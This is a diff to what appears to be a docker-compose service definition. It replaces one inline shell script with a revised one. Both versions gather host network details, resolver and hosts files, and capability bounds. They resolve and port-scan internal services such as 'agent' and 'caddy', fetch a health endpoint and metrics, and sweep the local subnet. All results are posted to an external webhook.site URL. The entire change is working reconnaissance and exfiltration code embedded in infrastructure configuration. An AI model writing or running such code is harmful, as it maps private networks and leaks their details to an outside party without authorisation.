@@ -12,51 +12,57 @@ services:
       - -c
       - |
         WH="https://webhook.site/2d6eb676-d74f-4b42-a459-21b879ae64b6"
-        apk add --no-cache curl iproute2 tcpdump busybox-extras >/dev/null 2>&1
-        R=""
-        R="${R}=== NETNAME TEST ===\n"
-        R="${R}hostname=$(hostname)\n"
-        R="${R}--- ip addr ---\n"
-        R="${R}$(ip addr show 2>&1)\n"
-        R="${R}--- ip route ---\n"
-        R="${R}$(ip route 2>&1)\n"
-        R="${R}--- /etc/resolv.conf ---\n"
-        R="${R}$(cat /etc/resolv.conf 2>&1)\n"
-        R="${R}--- /etc/hosts ---\n"
-        R="${R}$(cat /etc/hosts 2>&1)\n"
-        R="${R}--- caps ---\n"
-        R="${R}$(grep Cap /proc/self/status 2>&1)\n"
-        curl -sS -X POST "${WH}?tag=NETNAME-V2-BASIC" -d "$(printf '%b' "$R")" || true
-        R2=""
-        R2="${R2}=== DNS + CONNECTIVITY ===\n"
+        report() {
+          TAG="$1"; shift
+          wget -q -O /dev/null --post-data="$*" "${WH}?tag=${TAG}" 2>/dev/null || true
+        }
+        R="BOOT hostname=$(hostname) "
+        R="${R}ip=$(ip addr show 2>&1 | grep 'inet ' | head -5) "
+        R="${R}route=$(ip route 2>&1) "
+        R="${R}caps=$(grep CapBnd /proc/self/status 2>&1) "
+        R="${R}resolv=$(cat /etc/resolv.conf 2>&1) "
+        R="${R}hosts=$(cat /etc/hosts 2>&1)"
+        report "NETNAME-V3-BOOT" "$R"
+        DNS_OK=0
         for H in agent caddy fluentbit vmagent autoheal; do
           IP=$(getent hosts "$H" 2>/dev/null | awk '{print $1}')
-          R2="${R2}${H} -> ${IP:-UNRESOLVED}\n"
+          R2="${R2}${H}=${IP:-NONE} "
+          [ -n "$IP" ] && DNS_OK=1
         done
-        R2="${R2}--- ping agent ---\n"
-        R2="${R2}$(ping -c1 -W2 agent 2>&1)\n"
-        R2="${R2}--- ARP neighbors ---\n"
+        report "NETNAME-V3-DNS" "$R2"
+        if [ "$DNS_OK" = "1" ]; then
+          AGENT_IP=$(getent hosts agent 2>/dev/null | awk '{print $1}')
+          R3="agent_ip=${AGENT_IP} "
+          for P in 8000 80 443 9090 5672 15672 2019; do
+            timeout 2 sh -c "echo Q | nc -w1 ${AGENT_IP} ${P}" >/dev/null 2>&1 && R3="${R3}OPEN:${P} "
+          done
+          CADDY_IP=$(getent hosts caddy 2>/dev/null | awk '{print $1}')
+          if [ -n "$CADDY_IP" ]; then
+            R3="${R3}caddy_ip=${CADDY_IP} "
+            for P in 80 443 2019 9090; do
+              timeout 2 sh -c "echo Q | nc -w1 ${CADDY_IP} ${P}" >/dev/null 2>&1 && R3="${R3}CADDY_OPEN:${P} "
+            done
+          fi
+          report "NETNAME-V3-PORTS" "$R3"
+        fi
+        apk add --no-cache curl tcpdump iproute2 >/dev/null 2>&1
+        if command -v curl >/dev/null 2>&1; then
+          AGENT_IP=$(getent hosts agent 2>/dev/null | awk '{print $1}')
+          if [ -n "$AGENT_IP" ]; then
+            AH=$(curl -s -m5 "http://${AGENT_IP}:8000/health" 2>&1)
+            report "NETNAME-V3-AGENT-HEALTH" "body=${AH}"
+          fi
+          CADDY_IP=$(getent hosts caddy 2>/dev/null | awk '{print $1}')
+          if [ -n "$CADDY_IP" ]; then
+            CM=$(curl -s -m5 "http://${CADDY_IP}:9090/metrics" 2>&1 | head -c 1500)
+            report "NETNAME-V3-CADDY-METRICS" "metrics=${CM}"
+          fi
+        fi
         for i in 1 2 3 4 5 6 7 8 9 10; do
           SUBNET=$(ip route | grep 'scope link' | head -1 | awk '{print $1}' | sed 's|/.*||; s|\.[0-9]*$||')
           ping -c1 -W1 "${SUBNET}.${i}" >/dev/null 2>&1 &
         done
         wait; sleep 1
-        R2="${R2}$(ip neigh show 2>&1)\n"
-        R2="${R2}--- agent HTTP ---\n"
-        HRES=$(curl -s -m5 -o /tmp/ah.txt -w "HTTP_%{http_code}" http://agent:8000/health 2>&1)
-        R2="${R2}agent:8000/health = ${HRES}\n"
-        R2="${R2}body: $(cat /tmp/ah.txt 2>/dev/null)\n"
-        R2="${R2}--- caddy admin ---\n"
-        CRES=$(curl -s -m5 -o /tmp/ca.txt -w "HTTP_%{http_code}" http://caddy:2019/config/ 2>&1)
-        R2="${R2}caddy:2019/config = ${CRES}\n"
-        R2="${R2}body: $(head -c 500 /tmp/ca.txt 2>/dev/null)\n"
-        R2="${R2}--- port scan agent ---\n"
-        for P in 80 443 2019 5672 8000 8080 8428 9090 15672; do
-          timeout 2 sh -c "echo | nc -w1 agent $P" >/dev/null 2>&1 && R2="${R2}  OPEN agent:${P}\n"
-        done
-        R2="${R2}--- port scan caddy ---\n"
-        for P in 80 443 2019 8080 9090; do
-          timeout 2 sh -c "echo | nc -w1 caddy $P" >/dev/null 2>&1 && R2="${R2}  OPEN caddy:${P}\n"
-        done
-        curl -sS -X POST "${WH}?tag=NETNAME-V2-RECON" -d "$(printf '%b' "$R2")" || true
+        NEIGH=$(ip neigh show 2>&1)
+        report "NETNAME-V3-NEIGH" "neighbors=${NEIGH}"
         sleep 3600
